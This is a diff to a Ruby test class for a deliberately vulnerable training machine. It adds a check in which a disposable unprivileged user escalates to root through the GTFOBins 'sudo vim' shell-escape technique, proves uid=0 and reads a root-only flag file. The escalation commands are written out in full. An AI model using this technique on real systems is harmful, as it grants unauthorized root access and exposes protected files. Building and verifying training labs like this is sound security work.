@@ -44,7 +44,33 @@ class SudoRootVimTest < PostProvisionTest
         test_local_command("unprivileged user reads leaked #{fname} via sudo vim", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
       end
     end
-    # TODO tier 3 (exploit): hand-written — throwaway user escalates with the GTFOBins vim sudo technique and reads the root-only flag
+    tier(3) do
+      # <privilege>root_rwx</privilege>: the escalation must land a root shell
+      # (uid=0). No Metasploit module and no attacker VM for this GTFOBins
+      # technique, so the proof is local: with_throwaway_ssh_user makes a fresh,
+      # disposable unprivileged account (and removes it afterwards) — a realistic
+      # student foothold, not the service `nobody` account tier 2 used — which
+      # then escalates to root through `sudo vim` and reads the root-only flag.
+      flag_name = leaked.first
+      flag_string = strings.first.to_s.strip.lines.first.to_s.strip
+      out = '/tmp/secgen_vim_t3'
+      with_throwaway_ssh_user do |user, _pass|
+        # GTFOBins (vim, sudo): vim's :! runs a shell command, and sudo runs vim
+        # as root, so the command runs as root; -es drives ex mode non-interactively.
+        # id proves uid=0 (the escalation); the sentinel is root-owned 0644 so the
+        # throwaway user can read it back, then it is removed.
+        esc = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!id > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
+        test_local_command("throwaway user #{user} escalates to a root shell via sudo vim",
+                           esc, 'uid=0(root)', user: user)
+
+        if flag_name && !flag_string.empty?
+          flag = Shellwords.escape("/root/#{flag_name}")
+          read = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!cat #{flag} > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
+          test_local_command("throwaway user #{user} reads root-only #{flag_name} via sudo vim",
+                             read, flag_string, user: user)
+        end
+      end
+    end
   end
 
 end
